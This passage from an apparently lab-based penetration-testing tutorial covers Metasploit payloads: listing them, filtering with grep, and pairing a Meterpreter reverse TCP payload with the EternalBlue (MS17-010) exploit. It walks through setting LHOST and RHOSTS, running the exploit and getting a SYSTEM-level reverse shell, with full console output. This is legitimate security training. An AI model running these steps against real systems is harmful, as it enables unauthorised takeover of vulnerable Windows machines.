-    ----                                                ---------------  ----    -----  -----------
   <span class="hljs-number">0</span>    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, <span class="hljs-keyword">Bind </span>TCP Inline
   <span class="hljs-number">1</span>    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   <span class="hljs-number">2</span>    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   <span class="hljs-number">3</span>    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, <span class="hljs-keyword">Reverse </span>TCP Inline
   <span class="hljs-number">4</span>    <span class="hljs-keyword">android/meterpreter/reverse_http </span>                                    manual  No     <span class="hljs-keyword">Android </span>Meterpreter, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>HTTP Stager
   <span class="hljs-number">5</span>    <span class="hljs-keyword">android/meterpreter/reverse_https </span>                                   manual  No     <span class="hljs-keyword">Android </span>Meterpreter, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>HTTPS Stager
   <span class="hljs-number">6</span>    <span class="hljs-keyword">android/meterpreter/reverse_tcp </span>                                     manual  No     <span class="hljs-keyword">Android </span>Meterpreter, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>TCP Stager
   <span class="hljs-number">7</span>    <span class="hljs-keyword">android/meterpreter_reverse_http </span>                                    manual  No     <span class="hljs-keyword">Android </span>Meterpreter Shell, <span class="hljs-keyword">Reverse </span>HTTP Inline
   <span class="hljs-number">8</span>    <span class="hljs-keyword">android/meterpreter_reverse_https </span>                                   manual  No     <span class="hljs-keyword">Android </span>Meterpreter Shell, <span class="hljs-keyword">Reverse </span>HTTPS Inline
   <span class="hljs-number">9</span>    <span class="hljs-keyword">android/meterpreter_reverse_tcp </span>                                     manual  No     <span class="hljs-keyword">Android </span>Meterpreter Shell, <span class="hljs-keyword">Reverse </span>TCP Inline
   <span class="hljs-number">10</span>   <span class="hljs-keyword">android/shell/reverse_http </span>                                          manual  No     Command Shell, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>HTTP Stager
   <span class="hljs-number">11</span>   <span class="hljs-keyword">android/shell/reverse_https </span>                                         manual  No     Command Shell, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>HTTPS Stager
   <span class="hljs-number">12</span>   <span class="hljs-keyword">android/shell/reverse_tcp </span>                                           manual  No     Command Shell, <span class="hljs-keyword">Android </span><span class="hljs-keyword">Reverse </span>TCP Stager
   <span class="hljs-number">13</span>   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, <span class="hljs-keyword">Reverse </span>HTTP Inline

&lt;SNIP&gt;

   <span class="hljs-number">557</span>  windows/x64/vncinject/<span class="hljs-keyword">reverse_tcp </span>                                   manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 <span class="hljs-keyword">Reverse </span>TCP Stager
   <span class="hljs-number">558</span>  windows/x64/vncinject/<span class="hljs-keyword">reverse_tcp_rc4 </span>                               manual  No     Windows x64 VNC Server (Reflective Injection), <span class="hljs-keyword">Reverse </span>TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">559</span>  windows/x64/vncinject/<span class="hljs-keyword">reverse_tcp_uuid </span>                              manual  No     Windows x64 VNC Server (Reflective Injection), <span class="hljs-keyword">Reverse </span>TCP Stager with UUID Support (Windows x64)
   <span class="hljs-number">560</span>  windows/x64/vncinject/<span class="hljs-keyword">reverse_winhttp </span>                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (winhttp)
   <span class="hljs-number">561</span>  windows/x64/vncinject/<span class="hljs-keyword">reverse_winhttps </span>                              manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 <span class="hljs-keyword">Reverse </span>HTTPS Stager (winhttp)
</code></pre>
<p>As seen above, there are a lot of available payloads to choose from. Not only that, but we can create our payloads using <code>msfvenom</code>, but we will dive into that a little bit later. We will use the same target as before, and instead of using the default payload, which is a simple <code>reverse_tcp_shell</code>, we will be using a <code>Meterpreter Payload for Windows 7(x64)</code>.</p>
<p>Scrolling through the list above, we find the section containing <code>Meterpreter Payloads for Windows(x64)</code>.</p>
<p>Payloads</p>
<pre><code class="lang-shell-session">   <span class="hljs-number">515</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_ipv6_tcp </span>                               manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 <span class="hljs-keyword">Bind </span>TCP Stager
   <span class="hljs-number">516</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_ipv6_tcp_uuid </span>                          manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 <span class="hljs-keyword">Bind </span>TCP Stager with UUID Support
   <span class="hljs-number">517</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_named_pipe </span>                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Bind </span>Named Pipe Stager
   <span class="hljs-number">518</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp </span>                                    manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Bind </span>TCP Stager
   <span class="hljs-number">519</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp_rc4 </span>                                manual  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Bind </span>TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">520</span>  windows/x64/meterpreter/<span class="hljs-keyword">bind_tcp_uuid </span>                               manual  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Bind </span>TCP Stager with UUID Support (Windows x64)
   <span class="hljs-number">521</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_http </span>                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (wininet)
   <span class="hljs-number">522</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_https </span>                               manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (wininet)
   <span class="hljs-number">523</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_named_pipe </span>                          manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>Named Pipe (SMB) Stager
   <span class="hljs-number">524</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp </span>                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>TCP Stager
   <span class="hljs-number">525</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp_rc4 </span>                             manual  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse </span>TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">526</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_tcp_uuid </span>                            manual  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse </span>TCP Stager with UUID Support (Windows x64)
   <span class="hljs-number">527</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_winhttp </span>                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTP Stager (winhttp)
   <span class="hljs-number">528</span>  windows/x64/meterpreter/<span class="hljs-keyword">reverse_winhttps </span>                            manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse </span>HTTPS Stager (winhttp)
   <span class="hljs-number">529</span>  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Bind </span>Named Pipe Inline (x64)
   <span class="hljs-number">530</span>  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Bind </span>TCP Inline (x64)
   <span class="hljs-number">531</span>  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Reverse </span>HTTP Inline (x64)
   <span class="hljs-number">532</span>  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Reverse </span>HTTPS Inline (x64)
   <span class="hljs-number">533</span>  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Reverse </span>TCP Inline (IPv6) (x64)
   <span class="hljs-number">534</span>  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, <span class="hljs-keyword">Reverse </span>TCP Inline x64
</code></pre>
<p>As we can see, it can be pretty time-consuming to find the desired payload with such an extensive list. We can also use <code>grep</code> in <code>msfconsole</code> to filter out specific terms. This would speed up the search and, therefore, our selection.</p>
<p>We have to enter the <code>grep</code> command with the corresponding parameter at the beginning and then the command in which the filtering should happen. For example, let us assume that we want to have a <code>TCP</code> based <code>reverse shell</code> handled by <code>Meterpreter</code> for our exploit. Accordingly, we can first search for all results that contain the word <code>Meterpreter</code> in the payloads.</p>
<p><strong>MSF - Searching for Specific Payload</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; <span class="hljs-keyword">grep</span> meterpreter show payloads

   <span class="hljs-number">6</span>   payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   <span class="hljs-number">7</span>   payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   <span class="hljs-number">8</span>   payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   <span class="hljs-number">9</span>   payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   <span class="hljs-number">10</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">11</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   <span class="hljs-number">12</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> HTTP Stager (wininet)
   <span class="hljs-number">13</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> HTTP Stager (wininet)
   <span class="hljs-number">14</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> Named Pipe (SMB) Stager
   <span class="hljs-number">15</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> TCP Stager
   <span class="hljs-number">16</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse</span> TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">17</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse</span> TCP Stager with UUID Support (Windows x64)
   <span class="hljs-number">18</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> HTTP Stager (winhttp)
   <span class="hljs-number">19</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> HTTPS Stager (winhttp)


msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; <span class="hljs-keyword">grep</span> -c meterpreter show payloads

[*] <span class="hljs-number">14</span>
</code></pre>
<p>This gives us a total of <code>14</code> results. Now we can add another <code>grep</code> command after the first one and search for <code>reverse_tcp</code>.</p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; <span class="hljs-keyword">grep</span> meterpreter <span class="hljs-keyword">grep</span> reverse_tcp show payloads

   <span class="hljs-number">15</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 <span class="hljs-keyword">Reverse</span> TCP Stager
   <span class="hljs-number">16</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse</span> TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">17</span>  payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), <span class="hljs-keyword">Reverse</span> TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; <span class="hljs-keyword">grep</span> -c meterpreter <span class="hljs-keyword">grep</span> reverse_tcp show payloads

[*] <span class="hljs-number">3</span>
</code></pre>
<p>With the help of <code>grep</code>, we reduced the list of payloads we wanted down to fewer. Of course, the <code>grep</code> command can be used for all other commands. All we need to know is what we are looking for.</p>
<hr>
<h3 id="selecting-payloads">Selecting Payloads</h3>
<p>Same as with the module, we need the index number of the entry we would like to use. To set the payload for the currently selected module, we use <code>set payload &lt;no.&gt;</code> only after selecting an Exploit module to begin with.</p>
<p><strong>MSF - Select Payload</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          <span class="hljs-keyword">yes</span>       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
   RPORT          <span class="hljs-number">445</span>              <span class="hljs-keyword">yes</span>       The target port (TCP)
   SMBDomain      .                <span class="hljs-keyword">no</span>        (Optional) The Windows domain to use <span class="hljs-keyword">for</span> authentication
   SMBPass                         <span class="hljs-keyword">no</span>        (Optional) The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                         <span class="hljs-keyword">no</span>        (Optional) The username to authenticate as
   VERIFY_ARCH    true             <span class="hljs-keyword">yes</span>       Check <span class="hljs-keyword">if</span> remote architecture matches exploit Target.
   VERIFY_TARGET  true             <span class="hljs-keyword">yes</span>       Check <span class="hljs-keyword">if</span> remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Windows <span class="hljs-number">7</span> <span class="hljs-keyword">and</span> Server <span class="hljs-number">2008</span> R2 (x64) <span class="hljs-keyword">All</span> Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads

   <span class="hljs-number">15</span>  payload/windows/x64/meterpreter/reverse_tcp                          <span class="hljs-built-in">normal</span>  <span class="hljs-keyword">No</span>     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   <span class="hljs-number">16</span>  payload/windows/x64/meterpreter/reverse_tcp_rc4                      <span class="hljs-built-in">normal</span>  <span class="hljs-keyword">No</span>     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   <span class="hljs-number">17</span>  payload/windows/x64/meterpreter/reverse_tcp_uuid                     <span class="hljs-built-in">normal</span>  <span class="hljs-keyword">No</span>     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">15</span>

payload <span class="hljs-comment">=&gt; windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp
</code></pre>
<p>After selecting a payload, we will have more options available to us.</p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   <span class="hljs-comment">----           ---------------  --------  -----------</span>
   RHOSTS                          yes       The target host(s), <span class="hljs-keyword">range</span> CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> <span class="hljs-keyword">with</span> syntax <span class="hljs-symbol">'file</span>:&lt;path&gt;'
   RPORT          <span class="hljs-number">445</span>              yes       The target <span class="hljs-keyword">port</span> (TCP)
   SMBDomain      .                no        (Optional) The Windows domain <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">for</span> authentication
   SMBPass                         no        (Optional) The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                         no        (Optional) The username <span class="hljs-keyword">to</span> authenticate as
   VERIFY_ARCH    <span class="hljs-literal">true</span>             yes       Check <span class="hljs-keyword">if</span> remote <span class="hljs-keyword">architecture</span> matches exploit Target.
   VERIFY_TARGET  <span class="hljs-literal">true</span>             yes       Check <span class="hljs-keyword">if</span> remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   <span class="hljs-comment">----      ---------------  --------  -----------</span>
   EXITFUNC  thread           yes       <span class="hljs-keyword">Exit</span> technique (Accepted: '', seh, thread, <span class="hljs-keyword">process</span>, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen <span class="hljs-keyword">port</span>


Exploit target:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Windows <span class="hljs-number">7</span> <span class="hljs-keyword">and</span> Server <span class="hljs-number">2008</span> R2 (x64) <span class="hljs-keyword">All</span> Service Packs
</code></pre>
<p>As we can see, by running the <code>show payloads</code> command within the Exploit module itself, msfconsole has detected that the target is a Windows machine, and such only displayed the payloads aimed at Windows operating systems.</p>
<p>We can also see that a new option field has appeared, directly related to what the payload parameters will contain. We will be focusing on <code>LHOST</code> and <code>LPORT</code> (our attacker IP and the desired port for reverse connection initialization). Of course, if the attack fails, we can always use a different port and relaunch the attack.</p>
<hr>
<h3 id="using-payloads">Using Payloads</h3>
<p>Time to set our parameters for both the Exploit module and the payload module. For the Exploit part, we will need to set the following:</p>
<table>
<thead>
<tr>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>RHOSTS</code></td>
<td>The IP address of the remote host, the target machine.</td>
</tr>
<tr>
<td><code>RPORT</code></td>
<td>Does not require a change, just a check that we are on port 445, where SMB is running.</td>
</tr>
</tbody>
</table>
<p>For the payload part, we will need to set the following:</p>
<table>
<thead>
<tr>
<th><strong>Parameter</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>LHOST</code></td>
<td>The host&#39;s IP address, the attacker&#39;s machine.</td>
</tr>
<tr>
<td><code>LPORT</code></td>
<td>Does not require a change, just a check that the port is not already in use.</td>
</tr>
</tbody>
</table>
<p>If we want to check our LHOST IP address quickly, we can always call the <code>ifconfig</code> command directly from the msfconsole menu.</p>
<p><strong>MSF - Exploit and Payload Configuration</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(**windows/smb/ms17_010_eternalblue**) &gt; ifconfig

**[\*]** exec: ifconfig
<span class="hljs-symbol">
tun0:</span> flags=<span class="hljs-number">4305</span>&lt;<span class="hljs-meta">UP</span>,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu <span class="hljs-number">1500</span>

&lt;SNIP&gt;

inet <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span> netmask <span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span> destination <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>

&lt;SNIP&gt;


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>

LHOST =&gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>

RHOSTS =&gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>
</code></pre>
<p>Then, we can run the exploit and see what it returns. Check out the differences in the output below:</p>
<p>Payloads</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[*] Started reverse TCP handler on <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>:<span class="hljs-number">4444</span> 
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span>       - Host is likely VULNERABLE to MS17-<span class="hljs-number">010</span>! - Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> x64 (<span class="hljs-number">64</span>-bit)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span>       - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Connecting to target for exploitation.
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Connection established for exploitation.
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Target OS selected valid for OS indicated by SMB reply
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - CORE raw buffer dump (<span class="hljs-number">42</span> bytes)
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000000</span>  <span class="hljs-number">57</span> <span class="hljs-number">69</span> 6e <span class="hljs-number">64</span> 6f <span class="hljs-number">77</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span> <span class="hljs-number">72</span> 6f <span class="hljs-number">66</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span>  Windows <span class="hljs-number">7</span> Profes
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000010</span>  <span class="hljs-number">73</span> <span class="hljs-number">69</span> 6f 6e <span class="hljs-number">61</span> 6c <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span>  sional <span class="hljs-number">7601</span> Serv
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000020</span>  <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> 6b <span class="hljs-number">20</span> <span class="hljs-number">31</span>                    ice Pack <span class="hljs-number">1</span>      
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Target arch selected valid for arch indicated by DCE/RPC reply
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Trying exploit with <span class="hljs-number">12</span> Groom Allocations.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending all but last fragment of exploit packet
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Starting non-paged pool grooming
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending SMBv2 buffers
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending final SMBv2 buffers.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending last fragment of exploit packet!
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Receiving response from exploit packet
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="hljs-number">0xC000000D</span>)!
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Sending egg to corrupted connection.
[*] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - Triggering free of corrupted buffer.
[*] Sending stage (<span class="hljs-number">201283</span> bytes) to <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">49158</span>) <span class="hljs-meta">at</span> <span class="hljs-number">2020</span>-<span class="hljs-number">08</span>-<span class="hljs-number">14</span> <span class="hljs-number">11</span>:<span class="hljs-number">25</span>:<span class="hljs-number">32</span> +<span class="hljs-number">0000</span>
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.40</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter &gt; whoami

[-] Unknown command: whoami.


meterpreter &gt; getuid

Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>The prompt is not a Windows command-line one but a <code>Meterpreter</code> prompt. The <code>whoami</code> command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of <code>getuid</code>. Exploring the <code>help</code> menu gives us further insight into what Meterpreter payloads are capable of.</p>
<p><strong>MSF - Meterpreter Commands</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">meterpreter &gt; help

Core Commands
=============

    Command                   Description
    <span class="hljs-comment">-------                   -----------</span>
    ?                         Help menu
    background                Backgrounds <span class="hljs-keyword">the</span> current session
    bg                        Alias <span class="hljs-keyword">for</span> background
    bgkill                    Kills a background meterpreter <span class="hljs-keyword">script</span>
    bglist                    Lists <span class="hljs-built_in">running</span> background scripts
